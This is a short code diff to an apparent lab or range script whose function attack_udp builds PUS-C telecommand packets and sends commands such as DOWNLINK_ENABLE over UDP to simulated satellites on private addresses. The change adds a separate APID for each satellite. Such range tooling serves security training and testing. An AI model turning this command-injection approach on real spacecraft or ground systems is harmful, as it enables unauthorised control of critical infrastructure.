@@ -40,8 +40,12 @@ SAT_IPS = {
     "SpaceVE-1B": "192.168.61.101",
     "SpaceVE-1C": "192.168.61.102",
 }
-SAT_CMD_PORT   = 1234
-SATELLITE_APID = 0x200
+SAT_APIDS = {
+    "SpaceVE-1A": 0x200,
+    "SpaceVE-1B": 0x201,
+    "SpaceVE-1C": 0x202,
+}
+SAT_CMD_PORT = 1234
 
 COMMANDS = {
     "NOP":                     0x00,
@@ -85,11 +89,12 @@ def attack_udp(sat: str = "SpaceVE-1A", cmd: str = "DOWNLINK_ENABLE") -> bool:
     if fc is None:
         print(f"  [UDP] Unknown command '{cmd}'. Use --list to see options.")
         return False
-    ip  = SAT_IPS.get(sat)
+    ip   = SAT_IPS.get(sat)
+    apid = SAT_APIDS.get(sat, 0x200)
     if not ip:
         print(f"  [UDP] Unknown satellite '{sat}'")
         return False
-    pkt = build_pus_tc(SATELLITE_APID, fc)
+    pkt = build_pus_tc(apid, fc)
     print(f"  [UDP] Sending '{cmd}' (FC=0x{fc:02X}) PUS-C TC -> {ip}:{SAT_CMD_PORT}")
     print(f"  [UDP] Packet ({len(pkt)} bytes): {pkt.hex()}")
     try:
